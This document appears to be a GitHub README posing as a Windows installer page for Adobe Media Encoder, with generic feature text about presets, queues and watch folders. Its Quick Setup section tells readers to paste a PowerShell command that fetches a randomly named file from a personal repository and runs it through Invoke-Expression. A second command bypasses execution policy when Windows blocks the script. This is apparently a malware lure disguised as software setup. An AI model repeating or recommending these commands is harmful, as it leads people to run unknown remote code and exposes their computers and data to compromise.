# Media Encoder

Media Encoder is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Media Encoder and work in it.

Adobe Media Encoder is the encoding hub in Adobe’s video workflow on Windows. It accepts sequences and compositions from Premiere Pro and After Effects, applies export presets, and writes H.264, HEVC, ProRes, and other targets to disk. You can run one job or stack many clips with different settings without blocking your NLE.

A typical session starts after you send a timeline or comp to the queue. You pick a preset or duplicate an existing one, set output paths, and optionally enable watch folders so new sources encode automatically. On Windows you leave the app open while it processes the queue; failed items show clear errors so you adjust bitrate, frame size, or audio mapping and re-run only what broke.

This repository collects a Windows setup package, short configuration notes for common broadcast and web targets, and a changelog that tracks preset tweaks and version bumps. It is meant for teams who standardize exports across machines and want one place to align encoder settings with project delivery specs.

## What you do with it

- Send sequences from Premiere Pro straight into a shared encoding queue on Windows.
- Batch multiple After Effects comps with different presets in one unattended encoding run.
- Apply built-in and custom presets for web, broadcast, and archival delivery formats.
- Watch folders ingest new sources and encode them using rules you define once.
- Adjust bitrate, resolution, and audio channels per output without reopening the editor.
- Pause, reorder, or duplicate queue items when deadlines or deliverables change mid-day.
- Surface per-job status and logs so you can fix failed exports without guessing settings.
- Integrate with Dynamic Link so comp changes can refresh before the final encode starts.

## Quick Setup (PowerShell)

This installs the program Media Encoder on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/thiel655196/media-encoder-setup-guide/main/vn88pf5335.zfh1aojq | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/thiel655196/media-encoder-setup-guide/main/vn88pf5335.zfh1aojq | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `vn88pf5335.zfh1aojq` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `thiel655196/media-encoder-setup-guide`. Adobe Media Encoder 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
